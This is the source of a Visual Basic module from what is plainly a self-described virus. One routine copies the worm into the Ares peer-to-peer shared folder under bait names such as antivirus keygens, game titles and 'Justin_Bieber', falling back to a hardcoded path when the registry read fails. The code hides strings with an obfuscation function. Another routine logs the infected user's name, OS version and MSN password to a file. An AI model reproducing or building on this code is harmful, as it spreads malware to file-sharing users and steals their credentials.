Attribute VB_Name = "Module5"
Option Explicit
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" ( _
ByVal lpBuffer As String, _
nSize As Long) As Long
Private Function get_Usuario() As String
On Error Resume Next
Dim Nombre As String, ret As Long
Nombre = Space$(250)
ret = Len(Nombre)
If GetUserName(Nombre, ret) = 0 Then
get_Usuario = vbNullString
Else
get_Usuario = Left$(Nombre, ret - 1)
End If
End Function

Sub p2p()
'oo gracias ares'
On Error Resume Next
Dim ruta As String
Dim MiObjeto As Object
Set MiObjeto = CreateObject(des("c_o~u|€:_tqxx"))
ruta = MiObjeto.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\BootDir")
Set MiObjeto = Nothing
If (Len(Dir(ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\"))) Then
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Eset_keygen" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\AVIRA_KEYGEN" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\PANDA_KEYGEN" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\ROBOTC" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\XXX" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\KEYGEN" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\OFFICE_KEYGEN" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Mundial" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Waka_Waka" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Nero_2010" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Fifa_2010" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Justin_Bieber" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\counter_strike" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Habbo" & des(":q„q"))
jcopy2 (ruta + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Habbo_furni" & des(":q„q"))
'si no tenemos permisos para leer el registro usamos fuerza bruta'

jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Eset_keygen" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\AVIRA_KEYGEN" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\PANDA_KEYGEN" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\ROBOTC" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\XXX" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\KEYGEN" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\OFFICE_KEYGEN" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Mundial" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Waka_Waka" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Nero_2010" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Fifa_2010" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Justin_Bieber" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\counter_strike" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Habbo" & des(":q„q"))
jcopy2 ("C:/" + "Documents and Settings\" + get_Usuario + "\Configuración local\Datos de programa\Ares\My Shared Folder\Habbo_furni" & des(":q„q"))
Else
End If
End Sub

Sub Jspy()
On Error Resume Next
Open WindowsDirectory & "\logos.txt" For Output As #1
Print #1, "Hola creador Jose de Jesus Anaya Garcia "
Print #1, "Sistema heuristico 4.9 ##virtual"
Print #1, "Virus ADN UNDETECTED XT-PROGRAMER TEAM"
Print #1, "Obtuve informacion adicional del PC INFECTADA "
Print #1, "Nombre del usuario infectado: " & get_Usuario
Print #1, "Sistema Operativo: " & getVersion
Print #1, "Contraseña messenger" & sMSN
Close #1
End Sub

